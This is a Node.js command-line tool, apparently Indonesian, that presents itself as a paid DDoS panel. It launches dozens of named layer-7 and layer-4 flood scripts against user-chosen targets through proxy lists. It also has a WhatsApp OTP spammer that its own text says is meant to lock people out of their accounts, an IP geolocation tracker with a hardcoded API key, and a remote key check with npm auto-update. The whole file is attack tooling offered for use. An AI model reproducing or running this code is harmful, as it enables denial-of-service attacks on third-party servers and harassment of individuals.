#!/usr/bin/env node

const { exec, spawn } = require('child_process');
const readline = require('readline');
const url = require('url');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const version = '1.0.0';
let processList = [];

const dapxky = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// [========================================] //
async function banner() {
  console.clear();
  console.log(`

 Welcome To New Appearance Tools By Dapxz
 Gunakan Menu Sesuai Yang Ada Di List Yaa
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁


|| ── 𖥔  DapxzTools ${version}
|| ── 𖥔  Developer telegram : @DapxyCrash
|| ── 𖥔  Youtube name : @DapxyHost

`);
}

// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}

// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}

// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/dapxzhosting/dapxy/refs/heads/main/versi.txt');
    const latestVersion = await getLatestVersion.text();
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
      console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);

      const secretBangetJir = await fetch('https://raw.githubusercontent.com/dapxzhosting/dapxy/refs/heads/main/dapxz.txt');
      const password = await secretBangetJir.text();
      console.log(`masukan keynya wak`);
      dapxky.question('[\x1b[1m\x1b[31mDapxz Security\x1b[0m]: \n', async (skibidi) => {
        if (skibidi === password.trim()) {
          console.log(`Berhasil login wak`);
          await scrapeProxy();
          console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`);
          await scrapeUserAgent();
          console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`);
          await sleep(700);
          console.clear();
          console.log(`Welcome To Dapxz Tools ${version}`);
          await sleep(1000);
          await banner();
          console.log(`ketik help untuk memunculkan menu`);
          sigma();
        } else {
          console.log(`Key salah wak`);
          process.exit(-1);
        }
      });
    } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`);
      console.log(`Waiting Auto Update...`);
      await exec(`npm uninstall -g prmnmd-tuls`);
      console.log(`Installing update`);
      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Restart Tools Please`);
      process.exit();
    }
  } catch (error) {
    console.log(`Are You Online?`);
  }
}

// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
    return;
  }
  const [target] = args;
  if (target === '0.0.0.0') {
    console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`);
    sigma();
  } else {
    try {
      const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
      const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
      const res = await fetch(`https://ipwho.is/${target}`);
      const additionalInfo = await res.json();
      const ipInfo = await response.json();

      console.log(`
        Tracking IP Address Result 
========================================================================
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
        
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`);
      sigma();
    } catch (error) {
      console.log(`Error Tracking ${target}`);
      sigma();
    }
  }
}

// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration });
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}

// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
    console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}

// [========================================] //
async function handleAttackl4Command(args) {
  if (args.length < 3) {
    console.log(`Example: attackl4 <target> <duration> <l4methods>
attackl4 123.456.789.010 kill-ssh`);
    sigma();
	return
  }
const [target, duration, port , l4methods] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear();
console.log(`

⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

                    ${l4methods} Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${l4methods}`);
 if (l4methods === 'udp-raw') {
   pushOngoing(target, l4methods, duration)
   exec(`node ${metode} ${target} ${port} ${duration}`)
	sigma()
	  } else if (l4methods === 'kill-ssh') {
   pushOngoing(target, l4methods, duration)
   exec(`node ${metode} ${target} 22 root ${duration}`)
	sigma()
	} else if (l4methods === 'samp') {
   pushOngoing(target, l4methods, port, duration)
   exec(`node ${metode} ${target} ${port} ${duration}`)
	sigma()
	} else if (l4methods === 'mc-flood') {
   pushOngoing(target, l4methods, duration)
   const mc = path.join(__dirname, `/lib/cache/StarsXMc.js`);
   exec(`node ${mc} ${target} ${port} ${duration}`)
	sigma()
	} else if (l4methods === 'kill-do') {
   pushOngoing(target, l4methods, duration)
	const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
   } else {
    console.log(`Method ${l4methods} not recognized.`);
  }
};
// [========================================] // BATASS
async function handleAttackl7Command(args) {
  if (args.length < 3) {
    console.log(`Example: attackl7 <target> <duration> <l7methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, l7methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear();
console.log(`
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

 - Attacks Details -
Status : [ Attack Sent Successfully All Server ]
Host : [ ${target} ]
Time : [ ${duration} ]
Methods : [ ${l7methods} ]
Sent On : [ Comingsoon ]

 - Target Details - 
ISP : [ ${result.isp} ]
ORG : [ ${result.isp} ]
Ip : [ ${result.query} ]
AS : [ ${result.as} ]

 - Contact Person -
Dev Telegram : @DapxyCrash
My Youtube : @DapxyHost
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${l7methods}`);
 if (l7methods === 'lezkill') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
	sigma()
  } else if (l7methods === 'vxx') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
	sigma()
  } else if (l7methods === 'geckold') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
	sigma()
  } else if (l7methods === 'mix') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (l7methods === 'mixsyn') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 50`)
	sigma()
  } else if (l7methods === 'glory') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
	sigma()
  } else if (l7methods === 'skynet-tls') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
	sigma()
  } else if (l7methods === 'tls-vip') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
	sigma()
  } else if (l7methods === 'flood') {
   pushOngoing(target, l7methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (l7methods === 'tls') {
    pushOngoing(target, l7methods, duration)
     exec(`node ${metode} ${target} ${duration} 89 10`)
    sigma()
    } else if (l7methods === 'strike') {
      pushOngoing(target, l7methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (l7methods === 'kill') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10`)
        sigma()
        } else if (l7methods === 'bypass') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
          sigma()
          } else if (l7methods === 'raw') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (l7methods === 'thunder') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
          sigma()
          } else if (l7methods === 'rape') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
          sigma()
          } else if (l7methods === 'httpddos') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10`)
          sigma()
          } else if (l7methods === 'https-rapid') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (l7methods === 'httpx') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt --full`)
          sigma()
          } else if (l7methods === 'hyper') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10`)
          sigma()
          } else if (l7methods === 'medusa') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (l7methods === 'poseidon') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10`)
          sigma()
          } else if (l7methods === 'storm') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
          sigma()
          } else if (l7methods === 'destroy') {
       pushOngoing(target, l7methods, duration)
        exec(`node ${metode} ${target} ${duration} 89 10 proxy.txt`)
          } else if (l7methods === 'slim') {
       pushOngoing(target, l7methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${l7methods} not recognized.`);
  }
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.log(`
                    OTP Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Dev Telegram : @DapxyCrash

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.log(`

                        Subdomains Finder
========================================================================
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
dapxky.question('[\x1b[1m\x1b[31mDapxz Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/Dapxz/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
THANK ALL DEVELOPER AND DAPXZ

Thx To:
Dapxy ( Developer )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
Friend
Chrome
Allah SWT
`
dapxky.question('[\x1b[1m\x1b[32mDapxzTools Ddos\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
[=============WELCOME TO DAPXZ TOOLS===============]
|| l7methods    || METHODS L7
|| l4methods    || METHODS L4
|| track-ip     || LACAK IP
|| subdo-finder || MELIHAT DOMAIN - SUBDO
|| kill-wifi    || COMMING SOON
|| kill-otp.    || SPAM OTP WA / PAIRING
|| kill-ping    || COMMING SOON
|| attackl7     || ATTACK WEB L7
|| attackl4     || ATTACK L4
|| ongoing      || ONGOING ATTACK
|| news         || INFO NEW
|| ai           || CHAT AI GPT
|| credits      || CREDIT FOR DEVELOPER
|| clear        || CLEAR TERMINAL
[=============THANKS SUDAH MEMBELI=================]
`);
sigma();
  } else if (command === 'l4methods') {
    console.log(`
    
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

[==================ATTACK L4 METHODS=======================]
|| udp-raw  || VVIP
|| kill-ssh || VVIP
|| kill-do  || VVIP
|| samp     || VIP
|| mc-flood || VVIP
[===================THANKS======================]
`);
    sigma();
  } else if (command === 'l7methods') {
    console.log(` 
    
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

[==================ATTACK L7 METHODS=======================]
|| flood      || LAYER 7 
|| tls        || LAYER 7
|| strike     || LAYER 7 
|| kill       || LAYER 7
|| raw        || LAYER 7 
|| bypass     || LAYER 7 
|| thunder    || LAYER 7
|| storm      || LAYER 7
|| rape       || LAYER 7
|| destroy    || LAYER 7
|| slim       || LAYER 7
|| skynet-tls || LAYER 7
|| glory      || LAYER 7
|| mixsyn     || LAYER 7
|| mix        || LAYER 7 
|| vxx        || LAYER 7
|| geckold    || LAYER 7
|| lezkill    || LAYER 7
|| tls-vip    || LAYER 7
|| httpddos   || NEW
|| https-rapid|| NEW 
|| httpx      || NEW
|| hyper      || NEW
|| medusa     || NEW 
|| poseidon   || NEW 
[===================THANKS======================]
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attackl7') {
    handleAttackl7Command(args);
  } else if (command === 'attackl4') {
    handleAttackl4Command(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`Dapxz Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} CMD TIDAK ADA CIK`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()